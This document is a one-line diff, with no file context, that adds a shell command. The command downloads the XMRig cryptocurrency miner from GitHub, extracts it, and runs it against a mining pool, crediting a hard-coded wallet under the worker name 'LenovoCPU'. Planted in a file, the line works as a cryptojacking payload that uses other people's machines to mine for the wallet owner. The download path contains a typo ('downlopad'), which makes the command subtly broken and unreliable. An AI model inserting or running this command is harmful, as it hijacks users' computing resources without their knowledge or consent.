@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/downlopad/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o upx.miningocean.org:4332 -u UPX1S25sash4fRNVxv3zrs9qBCabk4ZhEgh4DZ1Nr1kNSLmRX2wjMVjNVbiFBR87fMEaMXbXvHEVHJtX4kfBLim23GmFYnwTVa -p LenovoCPU -a cn/upx2 -k --donate-level 1
